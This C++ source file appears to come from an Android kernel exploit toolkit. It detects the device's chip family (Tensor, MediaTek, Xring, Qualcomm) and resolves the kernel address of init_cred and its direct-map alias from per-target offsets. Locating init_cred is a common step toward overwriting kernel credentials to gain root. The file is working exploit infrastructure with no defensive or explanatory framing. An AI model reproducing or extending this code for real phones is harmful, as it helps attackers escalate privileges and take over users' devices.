#include "memory/address_space.h"

#include "target.h"

#include <cerrno>
#include <cstring>
#include <strings.h>

/* Measured direct-map end. Defaults to the built-in bound and can only be
 * narrowed by a rooted /proc/iomem dump (apply_iomem_cache). KernelSnitch
 * reads it to bound its scan; it is never an authority wider than target.h. */
uint64_t g_direct_map_end = DIRECT_MAP_END;

namespace ghostlock::memory {
#if defined(__ANDROID__)
#include <sys/system_properties.h>
#endif

#include <limits>

    /* Android property lookup is unavailable in host fixed-vector tests. The
 * non-Android branch keeps the QCOM default so the deterministic SoC-specific
 * derivations below can be exercised on the host; production is unchanged. */
#if defined(__ANDROID__)
    static SocFamily detect_target_soc(void) {
        char value[256];
        const char *keys[] = {
            "ro.soc.manufacturer", "ro.soc.model",
            "ro.board.platform", nullptr
        };
        for (int i = 0; keys[i]; ++i) {
            if (__system_property_get(keys[i], value) <= 0 || !value[0]) continue;
            if (strncasecmp(value, "google", 6) == 0 ||
                strncasecmp(value, "tensor", 6) == 0 ||
                (i > 0 && (strncasecmp(value, "gs", 2) == 0 ||
                           strncasecmp(value, "zuma", 4) == 0))) {
                return SocFamily::Google;
            }
        }
        for (int i = 0; keys[i]; ++i) {
            if (__system_property_get(keys[i], value) <= 0 || !value[0]) continue;
            if (strncasecmp(value, "mediatek", 8) == 0 ||
                strncasecmp(value, "mtk", 3) == 0 ||
                (i > 0 && strncasecmp(value, "mt", 2) == 0)) {
                return SocFamily::Mtk;
            }
        }
        for (int i = 0; keys[i]; ++i) {
            if (__system_property_get(keys[i], value) <= 0 || !value[0]) continue;
            if (strncasecmp(value, "xring", 5) == 0 ||
                (i > 0 && strncasecmp(value, "o1", 2) == 0)) {
                return SocFamily::Xring;
            }
        }
        return SocFamily::Qcom;
    }
#else
    static SocFamily detect_target_soc(void) {
        return SocFamily::Qcom;
    }
#endif

    int resolved_addresses_init_for_soc(ResolvedAddresses *out,
                                        const TargetProfile *profile,
                                        SocFamily soc) {
        const struct kernel_offsets *values = profile->values();
        if (!out || !values || !values->uname_r || !values->off_init_cred) {
            errno = EINVAL;
            return -1;
        }
        *out = ResolvedAddresses{};
        out->soc = soc;
        const auto image = target::KernelImageAddress(KIMAGE_TEXT_BASE)
                .checked_add(values->off_init_cred);
        if (!image) {
            errno = ERANGE;
            return -1;
        }
        out->init_cred_image = *image;
        if (values->kernel_phys_load) {
            out->kernel_phys_load = target::PhysicalAddress(
                values->kernel_phys_load);
        } else if (out->soc == SocFamily::Mtk || out->soc == SocFamily::Google) {
            /* Tensor G4/G5 (zumapro) loads the Image at the DRAM base like MTK. */
            out->kernel_phys_load = target::PhysicalAddress(
                KIMAGE_TEXT_BASE - MTK_VADDR_BASE);
        } else if (out->soc == SocFamily::Xring) {
            out->kernel_phys_load = target::PhysicalAddress(
                XRING_KERNEL_PHYS_LOAD);
        } else if (strncmp(values->uname_r, "6.12.", 5) == 0) {
            out->kernel_phys_load = target::PhysicalAddress(
                QC_GKI_6_12_PHYS_LOAD);
        } else {
            out->kernel_phys_load = target::PhysicalAddress(
                P0_KERNEL_PHYS_LOAD);
        }
        return 0;
    }

    int resolved_addresses_init(ResolvedAddresses *out,
                                const TargetProfile *profile) {
        return resolved_addresses_init_for_soc(out, profile, detect_target_soc());
    }

    uintptr_t resolved_addresses_data_alias(const ResolvedAddresses *addresses,
                                            uintptr_t image_addr) {
        if (!addresses) return 0;
        const auto result = resolved_addresses_data_alias_checked(
            *addresses, target::KernelImageAddress(image_addr));
        return result ? result->value() : 0;
    }

    std::optional<target::DirectMapAddress>
    resolved_addresses_data_alias_checked(
        const ResolvedAddresses &addresses,
        target::KernelImageAddress image_address) noexcept {
        const uintptr_t image = image_address.value();
        if (image < KIMAGE_TEXT_BASE) return std::nullopt;
        const uintptr_t offset = image - KIMAGE_TEXT_BASE;
        const auto physical = addresses.kernel_phys_load.checked_add(offset);
        if (!physical || physical->value() < P0_PHYS_OFFSET) return std::nullopt;
        const uintptr_t direct =
                (physical->value() - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;
        if (direct < P0_PAGE_OFFSET) return std::nullopt;
        return target::DirectMapAddress(direct);
    }

    const char *resolved_addresses_soc_name(const ResolvedAddresses *addresses,
                                            const TargetProfile *profile) {
        if (!addresses) return "unknown";
        if (addresses->soc == SocFamily::Mtk) return "mtk";
        if (addresses->soc == SocFamily::Xring) return "xring";
        const struct kernel_offsets *values = profile->values();
        if (addresses->soc == SocFamily::Google) {
            return values && values->kernel_phys_load ? "google/tensor" : "tensor";
        }
        return values && !values->kernel_phys_load && values->uname_r &&
               strncmp(values->uname_r, "6.12.", 5) == 0
                   ? "qcom/6.12"
                   : "qcom/other";
    }
} // namespace ghostlock::memory
